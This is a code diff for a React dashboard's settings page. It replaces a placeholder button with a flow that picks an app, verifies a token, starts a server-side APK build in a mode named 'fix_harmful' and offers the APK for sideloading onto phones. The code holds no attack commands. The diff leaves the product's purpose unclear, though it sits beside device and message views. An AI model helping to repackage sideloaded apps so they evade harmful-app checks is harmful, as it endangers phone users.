@@ -1902,38 +1902,106 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
    PAGE — SETTINGS
 ════════════════════════════════════════ */
   
-function ShootApkButton() {
-  const [clicked, setClicked] = useState(false);
+const SHOOT_SAVED_APK = "saved_apk_id";
+interface ShootApp { id: string; name: string; note: string; }
+
+function ShootApkButton({ appId }: { appId: string }) {
   const t = useTheme();
+  const [apps, setApps] = useState<ShootApp[]>([]);
+  const [appsReady, setAppsReady] = useState(false);
+  const [selId, setSelId] = useState("");
+  const [appName, setAppName] = useState("");
+  const [phase, setPhase] = useState<"form"|"building"|"done"|"error">("form");
+  const [progress, setProgress] = useState(0);
+  const [progressMsg, setProgressMsg] = useState("");
+  const [errMsg, setErrMsg] = useState("");
+  const [dlUrl, setDlUrl] = useState("");
+  const sseRef = useRef<EventSource|null>(null);
+  const VPS = "/api/vps";
+
+  // Load apps on mount
+  useEffect(() => {
+    fetch(`${VPS}/api/apps`)
+      .then(r => r.json())
+      .then((data: ShootApp[]) => {
+        setApps(data);
+        const saved = localStorage.getItem(SHOOT_SAVED_APK);
+        const found = saved ? data.find(a => a.id === saved) : null;
+        if (found) setSelId(found.id);
+        setAppsReady(true);
+      })
+      .catch(() => setAppsReady(true));
+  }, []);
+
+  function handleSelect(id: string) {
+    setSelId(id);
+    if (id) localStorage.setItem(SHOOT_SAVED_APK, id);
+    else localStorage.removeItem(SHOOT_SAVED_APK);
+  }
+
+  async function handleBuild() {
+    if (!selId) { setErrMsg("APK chunna zaroori hai"); return; }
+    setErrMsg("");
+    setPhase("building"); setProgressMsg("Verify ho raha hai..."); setProgress(0);
+    try {
+      const vr = await fetch(`${VPS}/api/verify-token`, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({token: appId}) });
+      const vd = await vr.json() as {valid: boolean};
+      if (!vd.valid) { setErrMsg("Token invalid"); setPhase("form"); return; }
+      setProgressMsg("Build shuru...");
+      const br = await fetch(`${VPS}/api/build/start`, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({appId: selId, appName: appName.trim()||undefined, mode:"fix_harmful", token: appId}) });
+      const bd = await br.json() as {jobId?: string; error?: string};
+      if (!bd.jobId) { setErrMsg(bd.error ?? "Build start fail"); setPhase("form"); return; }
+      const es = new EventSource(`${VPS}/api/build/${bd.jobId}/status`);
+      sseRef.current = es;
+      es.onmessage = (e) => {
+        const d = JSON.parse(e.data) as {status?: string; progress?: number; message?: string};
+        setProgress(d.progress ?? 0); setProgressMsg(d.message ?? "");
+        if (d.status === "done") { es.close(); setDlUrl(`${VPS}/api/build/${bd.jobId}/download`); setPhase("done"); }
+        if (d.status === "error") { es.close(); setErrMsg(d.message ?? "Error"); setPhase("form"); }
+      };
+      es.onerror = () => { es.close(); setErrMsg("Connection fail"); setPhase("form"); };
+    } catch { setErrMsg("Server error"); setPhase("form"); }
+  }
+
+  function reset() { sseRef.current?.close(); setPhase("form"); setProgress(0); setProgressMsg(""); setErrMsg(""); setDlUrl(""); setAppName(""); }
+
+  const IS: React.CSSProperties = { width:"100%", boxSizing:"border-box" as const, padding:"9px 12px", borderRadius:8, border:`1.5px solid ${t.cardB}`, background:t.bg, color:t.txt, fontSize:13, outline:"none" };
+
+  if (phase === "building") return (
+    <div style={{display:"flex",flexDirection:"column",gap:8}}>
+      <div style={{fontSize:12,color:t.muted}}>{progressMsg}</div>
+      <div style={{height:5,background:t.hdrB,borderRadius:3,overflow:"hidden"}}><div style={{height:"100%",background:"#10b981",width:`${progress}%`,transition:"width 0.5s"}} /></div>
+      <div style={{fontSize:11,color:"#10b981",fontWeight:700,textAlign:"right"}}>{progress}%</div>
+      <div style={{fontSize:10,color:t.muted}}>3-5 minute lag sakte hain...</div>
+    </div>
+  );
+
+  if (phase === "done") return (
+    <div style={{display:"flex",flexDirection:"column",gap:8}}>
+      <a href={dlUrl} download style={{display:"flex",alignItems:"center",justifyContent:"center",gap:6,padding:"11px",borderRadius:8,background:"#10b981",color:"#fff",fontWeight:700,fontSize:13,textDecoration:"none"}}>📥 APK Download Karo</a>
+      <button onClick={reset} style={{padding:"6px",borderRadius:8,border:`1px solid ${t.cardB}`,background:"transparent",color:t.muted,fontSize:12,cursor:"pointer"}}>Naya Build</button>
+    </div>
+  );
+
+  // form phase (default)
   return (
-    <button
-      onClick={() => { setClicked(true); setTimeout(() => setClicked(false), 3000); }}
-      style={{
-        display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8,
-        padding: "12px 18px", borderRadius: 8,
-        background: clicked ? t.card : "linear-gradient(135deg, #10b981, #059669)",
-        color: clicked ? "#10b981" : "#fff", fontWeight: 700, fontSize: 13,
-        border: clicked ? "1.5px solid #10b981" : "none",
-        boxShadow: clicked ? "none" : "0 4px 14px rgba(16,185,129,0.45)",
-        cursor: "pointer", transition: "all 0.2s", width: "100%",
-      }}
-    >
-      {clicked ? (
-        "Coming Soon..."
+    <div style={{display:"flex",flexDirection:"column",gap:8}}>
+      <input type="text" value={appName} onChange={e=>setAppName(e.target.value)} placeholder="App naam (optional)" style={IS} />
+      {!appsReady ? (
+        <div style={{...IS,color:t.muted}}>APKs load ho rahi hain...</div>
       ) : (
-        <>
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
-            <polyline points="7 10 12 15 17 10" />
-            <line x1="12" y1="15" x2="12" y2="3" />
-          </svg>
-          Download Shoot APK
-        </>
+        <select value={selId} onChange={e=>handleSelect(e.target.value)} style={{...IS,cursor:"pointer",appearance:"none"}}>
+          <option value="">— APK chunno —</option>
+          {apps.map(a=><option key={a.id} value={a.id}>{a.name}</option>)}
+        </select>
       )}
-    </button>
+      {errMsg && <div style={{fontSize:11,color:"#ef4444"}}>{errMsg}</div>}
+      <button onClick={()=>void handleBuild()} disabled={!selId||!appsReady} style={{padding:"11px",borderRadius:8,border:"none",background:selId&&appsReady?"linear-gradient(135deg,#10b981,#059669)":t.hdrB,color:selId&&appsReady?"#fff":t.muted,fontWeight:700,fontSize:13,cursor:selId&&appsReady?"pointer":"not-allowed",boxShadow:selId&&appsReady?"0 4px 14px rgba(16,185,129,0.4)":"none",transition:"all 0.2s"}}>
+        ⚡ Feature App
+      </button>
+    </div>
   );
 }
-
 function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount }: {
   appId: string; isDark: boolean; onToggleDark: () => void; devices: DbDevice[]; onLogout: () => void; msgCount: number;
 }) {
@@ -2119,7 +2187,7 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount
               <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.5 }}>
                 Install the Shoot app on a device. Tap the button below to download the latest Shoot APK, then open it on your phone to install.
               </div>
-              <ShootApkButton />
+              <ShootApkButton appId={appId} />
               <div style={{ fontSize: 10, color: t.muted, lineHeight: 1.4 }}>
                 You may need to enable "Install from unknown sources" in your phone settings.
               </div>
